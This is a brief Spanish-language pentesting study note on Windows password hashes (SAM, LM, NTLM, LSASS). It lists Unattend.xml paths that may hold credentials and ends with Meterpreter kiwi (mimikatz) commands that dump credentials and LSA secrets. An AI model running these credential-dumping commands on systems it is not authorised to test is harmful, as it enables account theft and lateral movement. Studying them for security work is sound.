# ¿Qué es?

Windows, mediante la base de datos **SAM** (*Security Account Manager*), mantiene las contraseñas guardadas como hashes. El formato era NT y se pasó a NTLM en Windows Vista.

## Base de datos SAM

La base de datos donde Windows guarda la información de los usuarios no puede copiarse cuando el sistema está en marcha. Por tanto los atacantes suelen intentar extraer los hashes del proceso **LSASS**. Para realizar esta operaciones se necesita una sesión privilegiada.

### LM (LanMan)

Es fácil de crackear, se trata de un algoritmo antiguo.

### NTLM (NTHash)

Es la versión utilizada actualmente.

# Searching for passwords

## Unattended Windows Setup

Es una herramienta utilizada para instalar windows remotamente. Si existen archivos relacionados con este servicio podrían contener credenciales:

```powershell
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

## [[mimikatz]]

Es una herramienta de postexplotación que nos permitirá dumpear los hashes.

```bash
load kiwi

creds_all

lsa_dump_sam
lsa_dump_secrets
```